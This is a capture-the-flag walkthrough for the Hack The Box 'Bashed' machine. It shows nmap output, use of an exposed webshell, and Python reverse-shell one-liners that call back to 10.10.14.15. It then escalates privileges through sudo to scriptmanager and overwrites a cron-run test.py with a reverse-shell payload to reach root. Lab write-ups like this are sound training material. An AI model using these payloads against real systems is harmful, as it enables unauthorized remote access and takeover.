# Bashed Walkthrough

## Enumeration
Initial nmap scan... Apache web server on port 80 is interesting...
```
# Nmap 7.93 scan initiated Sat Jun  3 13:20:27 2023 as: nmap -Pn -n -sVC -T4 -p- -v -oN initial 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.083s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  3 13:20:56 2023 -- 1 IP address (1 host up) scanned in 29.20 seconds
```

Gobuster for good measure.
```
```
Found a webshell at 10.10.10.68/dev.

Created a reverse shell calling back to a listener.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",8443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

What privileges do we have? 
```
sudo -l
```
scriptmanager does not require a password for sudo.

Run /bin/bash as scriptmanager and spawn a shell.
```
sudo -u scriptmanager /bin/bash
python -c ‘import pty; pty.spawn(“/bin/bash”);’
or
sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",7443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
scriptmanager is used to run scripts in the script folder.
```
ls -la
```

Create a scripted payload for scriptmanager to run, replacing the original text.py with our payload.
```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.15\",8443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > test.py
```
Catch the reverse shell with our listener. root.

[<img height="600" width="600px" src="https://github.com/zmiddle/htb/blob/main/bashed/bashed_pwned.png" />](https://www.hackthebox.com/achievement/machine/259690/118) 
